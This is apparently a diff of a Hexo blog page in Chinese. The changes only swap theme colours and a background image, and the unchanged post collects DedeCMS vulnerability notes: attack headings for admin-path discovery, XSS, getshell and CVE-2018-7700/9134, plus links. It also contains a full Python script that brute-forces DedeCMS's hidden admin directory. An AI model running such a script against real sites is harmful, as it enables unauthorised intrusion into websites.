@@ -41,7 +41,7 @@
 color="100,238,23" opacity='0.7' zIndex="-2" count="100" src="../../js/canvas-nest.min.js"></script>
  
   
-<body style="background: url(../../images/back.jpg); background-repeat: no-repeat;
+<body style="background: url(http://p4gdp8beq.bkt.clouddn.com/back1.png); background-repeat: no-repeat;
   background-size: 100% 100%;">
 
   
@@ -398,7 +398,7 @@ window.onload = function()
 
 
             </div>
-            <time class="pink-link-context" datetime="2018-10-10T13:34:00.000Z"><a href="/posts/797044da.html">2018-10-10</a></time>
+            <time class="red-link-context" datetime="2018-10-10T13:34:00.000Z"><a href="/posts/797044da.html">2018-10-10</a></time>
 
             <span id="busuanzi_container_page_pv" class="read-times-container">
     <i class="fa fa-eye"></i>
@@ -417,12 +417,12 @@ window.onload = function()
     </div>
 
 
-            <div class="toc pink-link-context hide-on-med-and-down">
+            <div class="toc red-link-context hide-on-med-and-down">
     <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#解决DEDECMS历史难题–找后台目录"><span class="section table-of-contents-text">解决DEDECMS历史难题–找后台目录</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#dedecms利用通配符找后台目录及其防御方案"><span class="section table-of-contents-text">dedecms利用通配符找后台目录及其防御方案</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#漏洞组合拳-重置dedecms管理员后台密码重现及分析"><span class="section table-of-contents-text">漏洞组合拳 | 重置dedecms管理员后台密码重现及分析</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#DedeCMS-V5-7-UTF8-SP2"><span class="section table-of-contents-text">DedeCMS-V5.7-UTF8-SP2</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#DedeCMS-v5-7-shops-delivery-存储型XSS"><span class="section table-of-contents-text">DedeCMS_v5.7_shops_delivery_存储型XSS</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#dedeCMS-V5-7-SP2-后台Getshell"><span class="section table-of-contents-text">dedeCMS V5.7 SP2 后台Getshell</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#Dedecms-V5-7后台任意代码执行-CVE-2018-7700"><span class="section table-of-contents-text">Dedecms V5.7后台任意代码执行[CVE-2018-7700]</span></a></li><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#DedeCMS-V5-7-SP2后台存在代码执行漏洞"><span class="section table-of-contents-text">DedeCMS V5.7 SP2后台存在代码执行漏洞</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#Dedecms-V5-7-后台文件重命名-CVE-2018-9134-getshell"><span class="section table-of-contents-text">Dedecms V5.7 后台文件重命名[CVE-2018-9134]  getshell</span></a></li><li class="section table-of-contents-item section table-of-contents-level-1"><a class="section table-of-contents-link" href="#DedeCMS-v5-7-友情链接CSRF-GetShell"><span class="section table-of-contents-text">DedeCMS_v5.7_友情链接CSRF_GetShell</span></a></li></ol>
 </div>
 
 
-            <div class="entry pink-link-context">
+            <div class="entry red-link-context">
                 <h1 id="解决DEDECMS历史难题–找后台目录"><a href="#解决DEDECMS历史难题–找后台目录" class="headerlink" title="解决DEDECMS历史难题–找后台目录"></a>解决DEDECMS历史难题–找后台目录</h1><p><a href="https://xz.aliyun.com/t/2064" target="_blank" rel="noopener">https://xz.aliyun.com/t/2064</a><br>py脚本：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-10-17 18:57:00</span></span><br><span class="line"><span class="comment"># @Author  : Your Name (you@example.org)</span></span><br><span class="line"><span class="comment"># @Link    : http://example.org</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line">import sys  </span><br><span class="line">reload(sys)  </span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf8'</span>)  </span><br><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line">characters= <span class="string">"bacdefghijklmnopqrstuvwxyz0123456789_!#"</span></span><br><span class="line">back_dir=<span class="string">""</span></span><br><span class="line">flag=0</span><br><span class="line">url=<span class="string">"http://192.168.0.6/uploads/tags.php"</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">"_FILES[mochazz][tmp_name]"</span>:<span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span>,</span><br><span class="line">	<span class="string">"_FILES[mochazz][name]"</span>:0,</span><br><span class="line">	<span class="string">"_FILES[mochazz][size]"</span>:0,</span><br><span class="line">	<span class="string">"_FILES[mochazz][type]"</span>:<span class="string">"image/gif"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> range(1,7):</span><br><span class="line">	<span class="keyword">if</span> flag:</span><br><span class="line">		<span class="built_in">break</span></span><br><span class="line">	<span class="keyword">for</span> pre <span class="keyword">in</span> itertools.permutations(characters,num):</span><br><span class="line">		pre=<span class="string">''</span>.join(list(pre))</span><br><span class="line">		data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = data[<span class="string">"_FILES[mochazz][tmp_name]"</span>].format(p=pre)</span><br><span class="line">		<span class="built_in">print</span> <span class="string">"test"</span>,pre</span><br><span class="line">		r=requests.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Upload filetype not allow"</span> not <span class="keyword">in</span> r.text and r.status_code==200:</span><br><span class="line">			flag=1</span><br><span class="line">			back_dir=pre</span><br><span class="line">			data[<span class="string">"_FIES[mochazz][tmp_name]"</span>]=<span class="string">'./&#123;p&#125;&lt;&lt;/images/adminico.gif'</span></span><br><span class="line">			<span class="built_in">break</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			data[<span class="string">"_FILES[mochazz][tmp_name]"</span>]=<span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"[+]前缀为:"</span>,back_dir</span><br><span class="line">flag=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(30):</span><br><span class="line">	<span class="keyword">if</span> flag:</span><br><span class="line">		<span class="built_in">break</span></span><br><span class="line">	<span class="keyword">for</span> ch <span class="keyword">in</span> characters:</span><br><span class="line">		<span class="keyword">if</span> ch==characters[-1]:</span><br><span class="line">			flag=1</span><br><span class="line">			<span class="built_in">break</span></span><br><span class="line">		data[<span class="string">"_FILES[mochazz][tmp_name]"</span>]=data[<span class="string">"_FILES[mochazz][tmp_name]"</span>].format(p=str(back_dir+ch))</span><br><span class="line">		r=requests.post(url,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Upload filetype not allow"</span> not <span class="keyword">in</span> r.text and r.status_code==200:</span><br><span class="line">	 		<span class="built_in">print</span> back_dir</span><br><span class="line">	 		back_dir+=ch</span><br><span class="line">	 		<span class="built_in">print</span> <span class="string">"[+]"</span>,back_dir</span><br><span class="line">	 		data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span><br><span class="line">        	<span class="built_in">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data[<span class="string">"_FILES[mochazz][tmp_name]"</span>] = <span class="string">"./&#123;p&#125;&lt;&lt;/images/adminico.gif"</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"后台地址为:"</span>,back_dir</span><br></pre></td></tr></table></figure></p>
 <h1 id="dedecms利用通配符找后台目录及其防御方案"><a href="#dedecms利用通配符找后台目录及其防御方案" class="headerlink" title="dedecms利用通配符找后台目录及其防御方案"></a>dedecms利用通配符找后台目录及其防御方案</h1><p><a href="https://paper.tuisec.win/detail/d1053143f127862" target="_blank" rel="noopener">https://paper.tuisec.win/detail/d1053143f127862</a> </p>
 <p>查看dede当前版本,补丁情况：</p>
@@ -443,7 +443,7 @@ window.onload = function()
 <h1 id="DedeCMS-v5-7-友情链接CSRF-GetShell"><a href="#DedeCMS-v5-7-友情链接CSRF-GetShell" class="headerlink" title="DedeCMS_v5.7_友情链接CSRF_GetShell"></a>DedeCMS_v5.7_友情链接CSRF_GetShell</h1><p><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5CSRF_GetShell</a></p>
 
                 
-<p class="pink-link-context">
+<p class="red-link-context">
     <a href="/posts/79704id1.html" rel="next" title="海盗云商">
     Prev: 海盗云商
   </a>
@@ -451,7 +451,7 @@ window.onload = function()
 
 
 
-<p class="pink-link-context">
+<p class="red-link-context">
     <a href="/posts/90656947.html" rel="next" title="php常见函数绕过">
     Next: php常见函数绕过
   </a>
@@ -677,7 +677,7 @@ var visitor = true;
     </div>
     
 
-    <div class="footer-copyright pink-link-context">
+    <div class="footer-copyright red-link-context">
         <div class="container">
             © 2016 example.com, All rights reserved.
             <p class="right" style="margin-top: 0;">Blog powered by <a href="https://hexo.io">Hexo</a> | Theme <a href="https://github.com/raytaylorlin/hexo-theme-raytaylorism">raytaylorism</a></p>
@@ -853,7 +853,7 @@ var visitor = true;
                             if (isMatch) {
                                 keywords.forEach(function(keyword) {
                                     var regS = new RegExp(keyword, "gi");
-                                    data_title = data_title.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                    data_title = data_title.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
                                 });
 
                                 str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
@@ -875,7 +875,7 @@ var visitor = true;
                                     // highlight all keywords
                                     keywords.forEach(function(keyword) {
                                         var regS = new RegExp(keyword, "gi");
-                                        match_content = match_content.replace(regS, "<span class=\"search-keyword pink lighten-2\">" + keyword + "</span>");
+                                        match_content = match_content.replace(regS, "<span class=\"search-keyword red lighten-2\">" + keyword + "</span>");
                                     });
 
                                     str += "<p class=\"search-result\">..." + match_content + "...</p>"
